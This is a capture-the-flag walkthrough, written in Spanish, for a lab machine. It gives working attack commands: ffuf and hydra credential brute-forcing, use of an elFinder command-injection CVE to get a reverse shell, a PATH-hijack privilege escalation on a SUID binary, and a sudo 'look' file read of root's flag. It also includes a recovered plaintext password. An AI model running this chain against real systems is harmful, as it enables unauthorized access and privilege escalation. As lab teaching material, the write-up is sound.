# Lookup - TryHackMe
**IP:** 10.10.99.209 (lookup.thm)

## Enumeración - usuarios y contraseña
El login devuelve mensajes distintos según el usuario exista o no. Fuzzeamos usuario y luego contraseña:
```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -u http://lookup.thm/login.php \
  -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -fw 10
# válido: jose
ffuf -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -X POST -u http://lookup.thm/login.php \
  -d "username=jose&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fw 8
```

## Foothold - elFinder RCE (CVE-2019-9194)
El login lleva a `files.lookup.thm` con **elFinder 2.1.47**, vulnerable a command injection (CVE-2019-9194) vía el comando de rotación. Con el exploit obtenemos reverse shell como `www-data`.

## Escalada - SUID pwm (PATH hijack) → sudo look
```bash
find / -perm /4000 2>/dev/null
# /usr/sbin/pwm  (SUID)
```
`pwm` llama a `id` sin ruta absoluta → hijack de PATH para filtrar credenciales de `think`:
```bash
echo -e '#!/bin/bash\necho "think"' > /tmp/id && chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```
```bash
# alternativa por SSH:
hydra -l think -P password.txt ssh://10.10.99.209
# think : josemario.AKA(think)
ssh think@10.10.99.209
sudo -l          # (root) NOPASSWD: /usr/bin/look
sudo look '' /root/root.txt
```
`look` lee archivos como root → flag.
